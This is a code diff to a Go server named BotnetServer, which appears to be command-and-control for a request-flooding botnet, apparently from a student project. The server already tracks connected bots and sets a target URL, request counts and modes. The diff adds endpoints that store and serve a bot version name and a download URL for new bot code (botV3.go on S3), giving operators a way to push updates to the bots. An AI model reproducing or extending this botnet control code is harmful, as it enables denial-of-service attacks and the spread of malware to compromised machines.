@@ -19,9 +19,11 @@ import (
 )
 
 type BotnetServer struct {
-	Status        bool
-	ConnectedBots map[string]time.Time
-	BotsResponses []BotStats
+	Status         bool
+	ConnectedBots  map[string]time.Time
+	BotsResponses  []BotStats
+	BotVersionName string
+	BotFileUrl     string
 }
 
 type BotStats struct {
@@ -62,13 +64,18 @@ type SetTimeSecondsReqBody struct {
 	TimeSeconds int `json:"timeSeconds"`
 }
 
+type SetBotVersionInfoReqBody struct {
+	BotVersionName string `json:"botVersionName"`
+	BotFileUrl     string `json:"botFileUrl"`
+}
+
 var AccessKeyID string
 var SecretAccessKey string
 var MyRegion string
 var filepath string
 
 var targetInfo = TargetInfo{"https://theuselessweb.com/", 10, "timeMode", 1}
-var botnetServer = BotnetServer{true, make(map[string]time.Time), []BotStats{}}
+var botnetServer = BotnetServer{true, make(map[string]time.Time), []BotStats{}, "botV3", "https://acsprojectfiles.s3.amazonaws.com/botV3.go"}
 var PORT = 5000
 
 func LoadEnv() {
@@ -234,6 +241,34 @@ func GetBotsStats(c *gin.Context) {
 	})
 }
 
+func GetBotVersionInfo(c *gin.Context) {
+	c.JSON(200, gin.H{
+		"botVersionName": botnetServer.BotVersionName,
+		"botFileUrl":     botnetServer.BotFileUrl,
+	})
+}
+
+func SetBotVersionInfo(c *gin.Context) {
+	var setBotVersionInfoReqBody SetBotVersionInfoReqBody
+	err := c.ShouldBindJSON(&setBotVersionInfoReqBody)
+
+	if err == nil {
+		botnetServer.BotVersionName = setBotVersionInfoReqBody.BotVersionName
+		botnetServer.BotFileUrl = setBotVersionInfoReqBody.BotFileUrl
+
+		c.JSON(200, gin.H{
+			"message": "BotVersionName has been set to " + setBotVersionInfoReqBody.BotVersionName +
+				", BotFileUrl has been set to " + setBotVersionInfoReqBody.BotFileUrl,
+		})
+		return
+	} else {
+		c.JSON(500, gin.H{
+			"messsage": "Oops, error while setting bot version information",
+		})
+		return
+	}
+}
+
 func SetRequestsNumber(c *gin.Context) {
 	var setRequestsNumberReqBody SetRequestsNumberReqBody
 	err := c.ShouldBindJSON(&setRequestsNumberReqBody)
@@ -316,6 +351,7 @@ func main() {
 	server.GET("/getServerStatus", GetServerStatus)
 	server.GET("/getConnectedBots", GetConnectedBots)
 	server.GET("/getBotsStats", GetBotsStats)
+	server.GET("/getBotVersionInfo", GetBotVersionInfo)
 	server.POST("/sendBotStat", PostSendBotStats)
 	server.POST("/setServerStatus", SetServerStatus)
 	server.POST("/changeTarget", ChangeTarget)
@@ -323,6 +359,7 @@ func main() {
 	server.POST("/setMode", SetMode)
 	server.POST("/setTimeSeconds", SetTimeSeconds)
 	server.POST("/uploadFile", UploadImage)
+	server.POST("/setBotVersionInfo", SetBotVersionInfo)
 
 	server.Run(":" + strconv.Itoa(PORT))
 }
